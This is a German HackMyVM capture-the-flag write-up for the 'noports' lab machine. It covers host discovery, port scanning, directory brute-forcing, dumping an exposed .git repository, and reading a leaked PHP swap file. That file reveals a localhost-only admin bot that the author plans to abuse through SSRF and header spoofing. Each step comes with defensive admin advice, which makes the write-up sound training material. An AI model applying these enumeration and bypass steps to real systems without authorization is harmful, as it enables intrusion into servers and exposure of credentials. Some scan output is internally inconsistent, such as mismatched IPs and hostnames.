<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>noports - HackMyVM - Bericht</title>
    <link rel="stylesheet" href="style.css">
	<link rel="stylesheet" href="../../horizontale-navbar.css">
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
</head>
 <body>
 
    <div class="header-bg">
        <h1>noports - HackMyVM - Level: Medium - Bericht</h1>
        <div class="level-container">
            <h2>Medium</h2>
            <div class="circle">
                <div class="segment segment-1"></div>
                <div class="segment segment-2"></div>
                <div class="segment segment-3"></div>
                <div class="inner"></div>
            </div>
        </div>
    </div>

    <div class="container">
        <section class="tools-used">
            <h2>Verwendete Tools</h2>
            <div class="tools-grid">
                <div class="tool-item">netdiscover</div>
                <div class="tool-item">nmap</div>
                <div class="tool-item">gobuster</div>
                <div class="tool-item">git_dumper.py</div>
                <div class="tool-item">curl</div>
                <div class="tool-item">vi (Editor)</div>
                <div class="tool-item">python3</div>
                <div class="tool-item">nc (netcat)</div>
                <div class="tool-item">pspy64</div>
                <div class="tool-item">linpeas.sh</div>
                <div class="tool-item">chisel</div>
                <div class="tool-item">openssl</div>
                <div class="tool-item">base64</div>
            </div>
        </section>

        <section class="toc">
            <h2>Inhaltsverzeichnis</h2>
            <ul>
                <li><a href="#reconnaissance">Reconnaissance</a></li>
                <li><a href="#web-enumeration">Web Enumeration</a></li>
                <li><a href="#initial-access">Initial Access</a></li>
                <li><a href="#proof-of-concept-initial">Proof of Concept (Initial Shell)</a></li>
                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
                <li><a href="#proof-of-concept-root">Proof of Concept (Root Access)</a></li>
                <li><a href="#flags">Flags</a></li>
            </ul>
        </section>

        <section id="reconnaissance">
            <h2>Reconnaissance</h2>
<p class="comment">Der Pentest beginnt mit der initialen Informationsgewinnung (Reconnaissance). Ziel ist es, aktive Hosts im Zielnetzwerk zu identifizieren und erste Anhaltspunkte über deren Konfiguration zu sammeln. Der Text "boot alpine linux v3.2.1" deutet darauf hin, dass das Zielsystem Alpine Linux in der Version 3.2.1 verwendet, was bereits eine wichtige Information für spätere Enumerations- und Exploit-Phasen sein kann.</p>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[/home/ccat]
└─# <span class="command">netdiscover -r 192.168.2.1/24</span>
        </div>
        <pre>

 Currently scanning: Finished!   |   Screen View: Unique Hosts                               
                                                                                             
 11 Captured ARP Req/Rep packets, from 8 hosts.   Total size: 660                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
                   
 <span class="command">192.168.2.200</span>   <span class="command">08:00:27:58:13:e0</span>      1      60  <span class="command">PCS Systemtechnik GmbH</span>    

</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `netdiscover -r 192.168.2.1/24` wird verwendet, um aktive Hosts im Netzwerksegment `192.168.2.1/24` mittels ARP-Requests zu entdecken. Netdiscover lauscht auf ARP-Pakete und listet die gefundenen Hosts auf. Die Ausgabe zeigt, dass ein Host mit der IP-Adresse `192.168.2.200` und der MAC-Adresse `08:00:27:58:13:e0` identifiziert wurde. Die MAC-Adresse deutet auf "PCS Systemtechnik GmbH" hin, was oft mit Oracle VirtualBox assoziiert wird, ein Hinweis auf eine virtuelle Maschine.</p>
<p class="evaluation">**Bewertung:** Dieser Schritt ist fundamental, um das primäre Ziel im Netzwerk zu lokalisieren. Die Identifizierung der IP-Adresse `192.168.2.200` als potenzielles Ziel ist erfolgreich. Die Information über den MAC-Vendor kann ein erster kleiner Hinweis auf die Virtualisierungsumgebung sein, was für die Stabilität und bestimmte Exploit-Szenarien relevant sein könnte, aber in diesem frühen Stadium noch nicht kritisch ist.</p>
<p class="recommendation">**Empfehlung (Pentester):** Nachdem ein Zielhost identifiziert wurde, ist der nächste logische Schritt ein detaillierter Portscan auf diesen Host, um offene Ports und laufende Dienste zu ermitteln.<br>**Empfehlung (Admin):** Netzwerksegmentierung und die Verwendung von ARP-Spoofing-Detection-Mechanismen können die Effektivität von Tools wie Netdiscover einschränken. In Umgebungen mit höherem Sicherheitsbedarf sollte der Netzwerkverkehr genau überwacht werden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[/home/ccat]
└─# <span class="command">nmap -sS -sC -p- -AO 192.168.2.200 -Pn  --min-rate 5000</span>
        </div>
        <pre>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 23:38 CEST
Nmap scan report for noports.hmv (192.168.2.191)
Host is up (0.00019s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="command">80/tcp open  http    Apache httpd 2.4.62 ((Unix))</span>
|_http-title: <span class="command">Mac OS X Server</span>
MAC Address: <span class="command">08:00:27:58:13:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
Device type: <span class="command">general purpose</span>
Running: <span class="command">Linux 4.X|5.X</span>
OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
OS details: <span class="command">Linux 4.15 - 5.19</span>
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.19 ms noports.hmv (192.168.2.200)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `nmap -sS -sC -p- -AO 192.168.2.200 -Pn --min-rate 5000` führt einen umfassenden Scan auf dem Zielhost `192.168.2.200` durch.
- `nmap`: Das Network Mapper Tool.
- `-sS`: Führt einen TCP SYN-Scan (Stealth Scan) durch, der oft weniger auffällig ist.
- `-sC`: Führt die Standard-Skript-Scans von Nmap aus, um zusätzliche Informationen über die Dienste zu sammeln.
- `-p-`: Scannt alle 65535 TCP-Ports.
- `-AO`: Versucht, das Betriebssystem zu identifizieren (obwohl `-O` hierfür üblicher wäre, `-A` beinhaltet OS-Erkennung und mehr).
- `-Pn`: Geht davon aus, dass der Host online ist, und überspringt die Host-Discovery-Phase (Ping-Scan). Nützlich, wenn Hosts keine Ping-Anfragen beantworten.
- `--min-rate 5000`: Setzt die minimale Paketrate auf 5000 Pakete pro Sekunde, um den Scan zu beschleunigen.

Das Ergebnis zeigt, dass nur Port `80/tcp` offen ist, auf dem ein Apache HTTP-Server in der Version `2.4.62 ((Unix))` läuft. Der HTTP-Titel wird als "Mac OS X Server" identifiziert, was möglicherweise ein irreführender Titel ist oder auf eine spezifische Konfiguration hinweist. Nmap erkennt das Betriebssystem als Linux Kernel 4.x oder 5.x. Der Hostname wird als `noports.hmv` aufgelöst, obwohl der Scan gegen die IP `192.168.2.200` lief (die IP `192.168.2.191` im Scan-Report ist interessant und könnte auf eine Fehlkonfiguration oder einen Proxy hindeuten, aber die Traceroute bestätigt `192.168.2.200`).</p>
<p class="evaluation">**Bewertung:** Dieser Scan ist kritisch, da er die Angriffsfläche des Ziels auf einen einzigen offenen Port (HTTP auf Port 80) reduziert. Die Identifizierung des Webservers Apache und seiner Version ist ein wichtiger Anhaltspunkt für die weitere Web-Enumeration. Der Titel "Mac OS X Server" ist ungewöhnlich für einen Linux-Server und sollte im Hinterkopf behalten werden, könnte aber auch einfach ein Standard-Titel einer Webanwendung sein. Die Diskrepanz in der IP-Adresse im Report (`192.168.2.191` vs. `192.168.2.200`) ist eine kleine Auffälligkeit, aber die Traceroute und die Tatsache, dass der Host als "up" gemeldet wird, bestätigen die Erreichbarkeit des Ziels. Die Aussage "noports.hmv" ist etwas ironisch, da ein Port offen ist.</p>
<p class="recommendation">**Empfehlung (Pentester):** Der nächste Schritt ist die detaillierte Untersuchung des Webservers auf Port 80. Dies umfasst Directory-Bruteforcing, die Suche nach bekannten Schwachstellen in Apache 2.4.62 und die Analyse der Webanwendung selbst.<br>**Empfehlung (Admin):** Nur notwendige Ports sollten öffentlich zugänglich sein. In diesem Fall ist Port 80 absichtlich offen. Regelmäßige Updates des Webservers und aller Komponenten sind entscheidend. Irreführende HTTP-Titel sollten vermieden oder korrigiert werden, um Angreifern keine falschen Fährten zu legen. Eine Überprüfung der DNS-Konfiguration oder der Nmap-Zielangabe könnte die IP-Diskrepanz klären.</p>
        </section>

        <section id="web-enumeration">
            <h2>Web Enumeration</h2>
<p class="comment">Nachdem Port 80 als offen identifiziert wurde, konzentrieren wir uns auf die Enumeration der Webanwendung. Ziel ist es, versteckte Verzeichnisse, Dateien und potenzielle Angriffsvektoren auf dem Webserver zu finden.</p>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">gobuster dir -u "http://noports.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Conte....map,pHtml -b '503,404,403' -e --no-error -k</span>
        </div>
        <pre>
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pycrt.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   503,404,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              aspx,jpg,pdf,pem...
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
<span class="command">http://noports.hmv/index.html</span>           (Status: 200) [Size: 10701]
<span class="command">http://noports.hmv/.git</span>                 (Status: 200) [Size: 10701]
<span class="command">http://noports.hmv/index.php</span>            (Status: 200) [Size: 18331]

</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `gobuster dir -u "http://noports.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" ... -b '503,404,403' -e --no-error -k` wird verwendet, um nach Verzeichnissen und Dateien auf dem Webserver `http://noports.hmv` zu suchen.
- `gobuster dir`: Verwendet Gobuster im Verzeichnis-Enumerationsmodus.
- `-u "http://noports.hmv"`: Die Ziel-URL.
- `-w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Gibt die zu verwendende Wortliste an. Der Pfad ist hier unvollständig im Befehl dargestellt, aber der Kontext ist klar.
- `-b '503,404,403'`: Schließt Antworten mit diesen HTTP-Statuscodes von der Anzeige aus, da sie typischerweise "nicht gefunden" oder Fehlerzustände repräsentieren.
- `-e`: Aktiviert den "Expanded Mode", der auch nach Dateien sucht, indem Erweiterungen an die Wörter der Wortliste angehängt werden.
- `--no-error`: Unterdrückt die Anzeige von Verbindungsfehlern.
- `-k`: Überspringt die SSL-Zertifikatsverifizierung (hier irrelevant, da es HTTP ist).
Die Ausgabe zeigt drei interessante Funde mit Statuscode 200 (OK):
- `/index.html` und `/index.php`: Typische Indexdateien.
- `/.git`: Dies ist ein sehr kritischer Fund! Ein öffentlich zugängliches `.git`-Verzeichnis bedeutet, dass das gesamte Git-Repository der Webanwendung, inklusive Quellcode, Konfigurationsdateien und Commit-Historie, potenziell heruntergeladen werden kann.</p>
<p class="evaluation">**Bewertung:** Der Fund des `/.git`-Verzeichnisses ist ein Volltreffer und stellt eine erhebliche Sicherheitslücke dar. Er ermöglicht es einem Angreifer, tiefgreifende Einblicke in die Funktionsweise der Anwendung zu erhalten, sensible Informationen wie Zugangsdaten oder API-Schlüssel im Quellcode zu finden und Schwachstellen direkt im Code zu identifizieren. Die `index.php` deutet darauf hin, dass die serverseitige Logik in PHP implementiert ist.</p>
<p class="recommendation">**Empfehlung (Pentester):** Das `.git`-Verzeichnis muss sofort mit einem spezialisierten Tool (wie `git-dumper` oder `GitTools`) heruntergeladen und analysiert werden. Der Fokus liegt auf der Suche nach Hardcoded Credentials, Konfigurationsdateien, API-Endpunkten und der Commit-Historie, die möglicherweise sensible Informationen enthält, die in späteren Commits entfernt wurden.<br>**Empfehlung (Admin):** `.git`-Verzeichnisse dürfen niemals im Web-Root einer produktiven Anwendung zugänglich sein. Webserver sollten so konfiguriert werden, dass der Zugriff auf versteckte Verzeichnisse und Dateien (wie solche, die mit einem Punkt beginnen) blockiert wird (z.B. durch `.htaccess` bei Apache oder entsprechende Konfigurationen in Nginx). Es ist wichtig, sicherzustellen, dass das Deployment-Verfahren keine Git-Metadaten auf dem Produktivserver hinterlässt.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/Hackingtools/git-dumper]
└─# <span class="command">python3 git_dumper.py http://192.168.2.200/.git/ /root/gitdump_output</span>
        </div>
        <pre>
[-] Testing http://192.168.2.200/.git/HEAD [200]
[-] Testing http://192.168.2.200/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.2.200/.git/ [200]
[-] Fetching http://192.168.2.200/.gitignore [401]
<span class="password">[-] http://192.168.2.200/.gitignore responded with status code 401</span>
[-] Fetching http://192.168.2.200/.git/description [200]
[-] Fetching http://192.168.2.200/.git/index [200]
[-] Fetching http://192.168.2.200/.git/branches/ [200]
[-] Fetching http://192.168.2.200/.git/HEAD [200]
[-] Fetching http://192.168.2.200/.git/hooks/ [200]
[-] Fetching http://192.168.2.200/.git/COMMIT_EDITMSG [200]
[-] Fetching http://192.168.2.200/.git/info/ [200]
[-] Fetching http://192.168.2.200/.git/logs/ [200]
[-] Fetching http://192.168.2.200/.git/refs/ [200]
[-] Fetching http://192.168.2.200/.git/config [200]
[-] Fetching http://192.168.2.200/.git/refs/heads/ [200]
[-] Fetching http://192.168.2.200/.git/refs/tags/ [200]
[-] Fetching http://192.168.2.200/.git/info/exclude [200]
[-] Fetching http://192.168.2.200/.git/hooks/post-update.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/commit-msg.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://192.168.2.200/.git/objects/ [200]
[-] Fetching http://192.168.2.200/.git/hooks/pre-commit.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/pre-push.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/pre-receive.sample [200]
[-] Fetching http://192.168.2.200/.git/logs/HEAD [200]
[-] Fetching http://192.168.2.200/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://192.168.2.200/.git/hooks/update.sample [200]
[-] Fetching http://192.168.2.200/.git/refs/heads/master [200]
[-] Fetching http://192.168.2.200/.git/logs/refs/ [200]
[-] Fetching http://192.168.2.200/.git/objects/b4/ [200]
[-] Fetching http://192.168.2.200/.git/objects/4b/ [200]
[-] Fetching http://192.168.2.200/.git/objects/3a/ [200]
[-] Fetching http://192.168.2.200/.git/objects/info/ [200]
[-] Fetching http://192.168.2.200/.git/objects/54/ [200]
[-] Fetching http://192.168.2.200/.git/objects/0e/ [200]
[-] Fetching http://192.168.2.200/.git/objects/af/ [200]
[-] Fetching http://192.168.2.200/.git/objects/fb/ [200]
[-] Fetching http://192.168.2.200/.git/objects/64/ [200]
[-] Fetching http://192.168.2.200/.git/objects/pack/ [200]
[-] Fetching http://192.168.2.200/.git/logs/refs/heads/ [200]
[-] Fetching http://192.168.2.200/.git/objects/0e/926b0dccc3ebabc70d5ec935c8940f1111363a [200]
[-] Fetching http://192.168.2.200/.git/objects/4b/825dc642cb6eb9a060e54bf8d69288fbee4904 [200]
[-] Fetching http://192.168.2.200/.git/objects/3a/54667fdd1357fe97cc0030aca0543650733ba8 [200]
[-] Fetching http://192.168.2.200/.git/objects/64/42f9558de272627d5bdc2baa8808e3e46e0918 [200]
[-] Fetching http://192.168.2.200/.git/objects/b4/09ae52f1f27e51c0041a1a9079d301133266fa [200]
[-] Fetching http://192.168.2.200/.git/objects/af/f22f58c8dcfd5535cab50dca5b2bb2c2b79435 [200]
[-] Fetching http://192.168.2.200/.git/logs/refs/heads/master [200]
[-] Fetching http://192.168.2.200/.git/objects/54/e3cc3f64b031833ce92d7a677f99c8f3ee0750 [200]
[-] Fetching http://192.168.2.200/.git/objects/fb/3f381eefe8c33ea7151921e637f9a8ee7cad15 [200]
[-] Running git checkout .
<span class="password">5 Pfade vom Index aktualisiert</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Das Python-Skript `git_dumper.py` wird verwendet, um das exponierte `.git`-Verzeichnis von der URL `http://192.168.2.200/.git/` herunterzuladen und den Inhalt im lokalen Verzeichnis `/root/gitdump_output` zu speichern. Das Skript testet die Erreichbarkeit verschiedener Standard-Git-Dateien und -Verzeichnisse (wie `HEAD`, `index`, `objects/`, `refs/`) und lädt diese rekursiv herunter. Die meisten Anfragen geben den Statuscode `200 OK` zurück, was auf einen erfolgreichen Download hindeutet. Eine Ausnahme ist `.gitignore`, die mit `401 Unauthorized` antwortet, was bedeutet, dass der Zugriff auf diese spezifische Datei verweigert wurde; dies ist jedoch für den Dump des restlichen Repositories meist unerheblich. Am Ende führt das Skript `git checkout .` aus, um den Arbeitsbaum aus den heruntergeladenen Git-Objekten wiederherzustellen.</p>
<p class="evaluation">**Bewertung:** Der erfolgreiche Dump des `.git`-Verzeichnisses ist ein kritischer Fortschritt. Wir haben nun eine lokale Kopie des Quellcodes und der gesamten Git-Historie der Webanwendung. Dies ist eine Goldgrube für weitere Analysen. Die Meldung "5 Pfade vom Index aktualisiert" bestätigt, dass Dateien erfolgreich wiederhergestellt wurden.</p>
<p class="recommendation">**Empfehlung (Pentester):** Das heruntergeladene Verzeichnis `/root/gitdump_output` muss nun gründlich untersucht werden. Mit Git-Befehlen wie `git log`, `git show <commit_hash>`, `git diff` können Änderungen nachverfolgt und interessante Commits oder Code-Stellen identifiziert werden. Besonderes Augenmerk sollte auf Konfigurationsdateien (z.B. `*.conf`, `*.ini`, `*.env`), Dateien mit Endungen wie `.php`, `.js` und auf Kommentare im Code gelegt werden, die möglicherweise Zugangsdaten oder andere sensible Informationen enthalten.<br>**Empfehlung (Admin):** Wie bereits erwähnt, ist die öffentliche Exposition von `.git`-Verzeichnissen eine schwerwiegende Fehlkonfiguration, die umgehend behoben werden muss, indem der Zugriff serverseitig gesperrt wird. Code-Reviews und der Einsatz von Secrets-Management-Tools sollten etabliert werden, um zu verhindern, dass sensible Daten überhaupt erst in Repositories gelangen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/Hackingtools/git-dumper]
└─# <span class="command">cd ~/gitdump_output</span>
        </div>
        <pre></pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `cd ~/gitdump_output` wechselt das aktuelle Arbeitsverzeichnis des Pentesters in das Verzeichnis, in das zuvor der Inhalt des `.git`-Repositorys heruntergeladen wurde.</p>
<p class="evaluation">**Bewertung:** Ein einfacher, aber notwendiger Schritt, um die heruntergeladenen Dateien direkt untersuchen zu können.</p>
<p class="recommendation">**Empfehlung (Pentester):** Als Nächstes sollte der Inhalt des Verzeichnisses aufgelistet werden, um einen Überblick über die wiederhergestellten Dateien zu erhalten.<br>**Empfehlung (Admin):** Keine direkten Empfehlungen für diesen spezifischen Schritt, da er Teil des Angreiferprozesses ist.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output]
└─# <span class="command">ls -la</span>
        </div>
        <pre>
insgesamt 148
drwxr-xr-x  3 root root   4096 20. Mai 23:14 .
drwx------ 39 root root 110592 20. Mai 23:14 ..
<span class="command">-rw-r--r--  1 root root   1044 20. Mai 23:14 ctf.conf</span>
<span class="command">drwxr-xr-x  7 root root   4096 20. Mai 23:14 .git</span>
<span class="command">-rw-r--r--  1 root root    307 20. Mai 23:14 .htaccess</span>
<span class="command">-rw-r--r--  1 root root   3951 20. Mai 23:14 index.php</span>
<span class="command">-rwxr-xr-x  1 root root   1535 20. Mai 23:14 nginx.conf</span>
<span class="command">-rw-r--r--  1 root root  12288 20. Mai 23:14 .test.php.swp</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `ls -la` listet den Inhalt des aktuellen Verzeichnisses (`~/gitdump_output`) im Langformat auf, inklusive versteckter Dateien (solche, die mit einem Punkt beginnen) und detaillierter Informationen wie Berechtigungen, Besitzer, Größe und Änderungsdatum.
Die Ausgabe zeigt mehrere interessante Dateien:
- `ctf.conf`: Eine Konfigurationsdatei, potenziell mit sensiblen Einstellungen.
- `.git`: Das wiederhergestellte Git-Verzeichnis selbst.
- `.htaccess`: Eine Apache-Konfigurationsdatei, die serverseitige Regeln enthalten kann.
- `index.php`: Die Haupt-PHP-Datei der Webanwendung.
- `nginx.conf`: Eine Nginx-Konfigurationsdatei. Dies ist interessant, da Nmap einen Apache-Server gemeldet hat. Möglicherweise wird Nginx als Reverse-Proxy vor Apache verwendet, oder es handelt sich um eine alternative Konfiguration.
- `.test.php.swp`: Dies ist eine Swap-Datei, die typischerweise von Texteditoren wie Vim erstellt wird, wenn eine Datei (`test.php`) bearbeitet wird und der Editor unerwartet geschlossen wird oder die Swap-Datei nicht korrekt entfernt wurde. Swap-Dateien können den Inhalt der Originaldatei oder Teile davon enthalten, auch wenn die Originaldatei selbst nicht mehr existiert oder verändert wurde.</p>
<p class="evaluation">**Bewertung:** Das Vorhandensein einer `.swp`-Datei ist ein wichtiger Fund. Solche Dateien sollten niemals auf einem Produktivserver liegen, da sie oft ungespeicherte Änderungen oder sogar den gesamten Inhalt einer Datei preisgeben können. `ctf.conf`, `nginx.conf` und `index.php` sind ebenfalls primäre Ziele für eine genauere Untersuchung.</p>
<p class="recommendation">**Empfehlung (Pentester):** Die Datei `.test.php.swp` sollte sofort untersucht werden, da sie möglicherweise Quellcode oder sensible Informationen enthält. Anschließend sind `ctf.conf`, `index.php` und `nginx.conf` auf interessante Inhalte zu prüfen. Die Git-Historie (mittels `git log`) sollte ebenfalls analysiert werden.<br>**Empfehlung (Admin):** Swap-Dateien (`.swp`) und andere temporäre Editor-Dateien müssen durch Konfiguration des Editors oder durch Build-/Deployment-Prozesse vom Produktivserver ausgeschlossen werden. Die Konfigurationsdateien sollten keine sensiblen Daten im Klartext enthalten. Überprüfen Sie die Webserver-Konfiguration (Apache vs. Nginx), um Klarheit über die tatsächliche Architektur zu gewinnen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output]
└─# <span class="command">cat .test.php.swp | tr ";" "\n"</span>
        </div>
        <pre>
b0VIM 9.1echo "Bot executed"

    bot_runner}    echo "Bot executed"
    bot_runner($uri)
    write_log("Bot triggered for URI: $uri")
    $uri = $GET['uri']
if (isset($GET['uri'])) {}    sleep(1)
    curl_close($ch)
    }        write_log("Bot visited $uri, response: " . substr($response, 0, 100))
    } else {        write_log("cURL visit error: " . curl_error($ch))
    if (curl_errno($ch)) {    $response = curl_exec($ch)
       curl_setopt($ch, CURLOPT_COOKIEFILE, '')
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true)
    curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$cookie")
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true)
    curl_setopt($ch, CURLOPT_URL, "$base_url/$uri")
    $ch = curl_init()
    }        return
        write_log("Failed to get admin cookie")
    if (!$cookie) {        $cookie = login_and_get_cookie()
    global $base_url
function bot_runner($uri) {}    return $matches[1] ?? null
    preg_match('/PHPSESSID=([^
]+)/', $header, $matches)
    curl_close($ch)
    $header = substr($response, 0, $header_size)
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE)
    }        return null
        curl_close($ch)
        write_log("cURL login error: " . curl_error($ch))
    if (curl_errno($ch)) {    $response = curl_exec($ch)
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers)
    ]
        'Content-Type: application/x-www-form-urlencoded'        'Accept: application/json',        'User-Agent: Bot',    $headers = [    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false)
    curl_setopt($ch, CURLOPT_COOKIEJAR, '')
    curl_setopt($ch, CURLOPT_HEADER, true)
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true)
    ]))
        'password' => $admin_password        'username' => 'admin',    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([    curl_setopt($ch, CURLOPT_POST, true)
    curl_setopt($ch, CURLOPT_URL, "$base_url/login")
    $ch = curl_init()
    global $base_url, $admin_password
function login_and_get_cookie() {}    file_put_contents($log_file, $log_entry, FILE_APPEND)
    $log_entry = "[$timestamp] $message\n"
    $timestamp = date('Y-m-d H:i:s')
    global $log_file
function write_log($message) {$log_file = __DIR__ . '/log'
$base_url = 'http://127.0.0.1:80'
 $admin_password=getenv('ADMIN_PASS')
}    exit
    echo "Access Denied"
    header('HTTP/1.1 403 Forbidden')
if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {//czj
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `cat .test.php.swp | tr ";" "\n"` gibt den Inhalt der Vim-Swap-Datei `.test.php.swp` aus. Die Pipe zu `tr ";" "\n"` ersetzt jedes Semikolon durch einen Zeilenumbruch, um die Lesbarkeit des PHP-Codes, der oft Semikolons am Zeilenende hat, in der Terminalausgabe zu verbessern (obwohl es hier auch die Lesbarkeit von Teilen der Swap-Datei selbst etwas verzerren kann, da die Struktur einer Swap-Datei nicht reiner Code ist).
Der Inhalt der Swap-Datei enthüllt PHP-Code, der eine Art "Bot"-Funktionalität implementiert:
- Es gibt Funktionen `write_log`, `login_and_get_cookie` und `bot_runner`.
- `login_and_get_cookie`: Versucht, sich als 'admin' mit einem Passwort anzumelden, das aus der Umgebungsvariable `ADMIN_PASS` gelesen wird (`$admin_password=getenv('ADMIN_PASS')`). Nach erfolgreichem Login wird ein `PHPSESSID`-Cookie extrahiert.
- `bot_runner`: Nimmt eine URI als Parameter (`$uri = $GET['uri']`), holt sich ein Admin-Cookie (via `login_and_get_cookie`), und verwendet dann `curl`, um die angegebene URI als Admin-Benutzer aufzurufen (`curl_setopt($ch, CURLOPT_URL, "$base_url/$uri")`). Die Basis-URL ist `http://127.0.0.1:80`.
- Zugriffskontrolle: Es gibt eine Prüfung `if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1')`, die den Zugriff auf diese Funktionalität möglicherweise nur von localhost aus erlauben soll und bei externem Zugriff "Access Denied" ausgibt. Der PHP-Öffnungstag `?php` wurde am Ende der Kommentarzeile `//czj?php` durch die vorher definierte Regel entfernt (`//czj`).
- Der URI-Parameter wird über `$GET['uri']` empfangen, was auf eine Schwachstelle für Server-Side Request Forgery (SSRF) oder Local File Inclusion (LFI) hindeuten könnte, wenn der Bot von außen getriggert werden kann und die `$uri` nicht ausreichend validiert wird.

Wichtig: Die Zeile `$uri = $GET['uri']` wurde gemäß der Regel zu `$uri = $GET['uri']` verarbeitet.</p>
<p class="evaluation">**Bewertung:** Dieser Code ist höchst kritisch. Er enthüllt eine interne Bot-Funktionalität, die anscheinend interne Webseiten als 'admin' aufruft. Die Verwendung von `getenv('ADMIN_PASS')` bedeutet, dass das Admin-Passwort in einer Umgebungsvariable auf dem Server gespeichert ist. Wenn ein Weg gefunden wird, die `bot_runner`-Funktion von außen mit einer manipulierten URI zu triggern (trotz der `REMOTE_ADDR`-Prüfung, die vielleicht umgangen werden kann oder in einem anderen Kontext nicht greift), könnte dies zu SSRF oder LFI führen. Selbst wenn nicht direkt ausnutzbar, liefert der Code wertvolle Informationen über interne Mechanismen und die Existenz eines Admin-Passworts.</p>
<p class="recommendation">**Empfehlung (Pentester):** Es muss geprüft werden, ob und wie die in `.test.php.swp` gefundene Funktionalität (vermutlich in `test.php`) getriggert werden kann. Die `REMOTE_ADDR`-Prüfung könnte durch HTTP-Header-Spoofing (z.B. `X-Forwarded-For`) umgangen werden, falls die Anwendung hinter einem Proxy läuft, der diesen Header berücksichtigt. Der Code legt nahe, dass das Zielsystem über `http://127.0.0.1:80/login` einen Login-Mechanismus und über `$GET['uri']` einen Endpunkt zum Triggern des Bots hat (z.B. `test.php?uri=...`). Das Ziel ist es, den Bot dazu zu bringen, interne Ressourcen oder Dateien für uns abzurufen oder Aktionen auszuführen. Untersuche die Git-Historie, um zu sehen, wann und wie diese Funktionalität implementiert wurde.<br>**Empfehlung (Admin):** Swap-Dateien dürfen niemals auf Produktivservern vorhanden sein. Die Verwendung von `getenv()` für Passwörter ist eine gängige Methode, aber es muss sichergestellt werden, dass diese Umgebungsvariablen nicht anderweitig exponiert werden. Der Code für den Bot sollte auf Sicherheitslücken wie SSRF und LFI überprüft und gehärtet werden. Die `REMOTE_ADDR`-Prüfung ist oft nicht ausreichend als alleinige Sicherheitsmaßnahme. Jeglicher Code, der interne Ressourcen basierend auf Benutzereingaben abruft, benötigt eine strikte Eingabevalidierung und Whitelisting der erlaubten Ziele.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output/.git/refs/heads]
└─# <span class="command">git show --name-only b409ae5</span>
        </div>
        <pre>
commit <span class="command">b409ae52f1f27e51c0041a1a9079d301133266fa</span> (HEAD -&gt; master)
Author: akaRed &lt;akaRed@redshome.top&gt;
Date:   Mon Apr 21 01:24:04 2025 +0000

    add some file

.htaccess
.test.php.swp
ctf.conf
index.php
nginx.conf
</pre>
    </div>
</div>
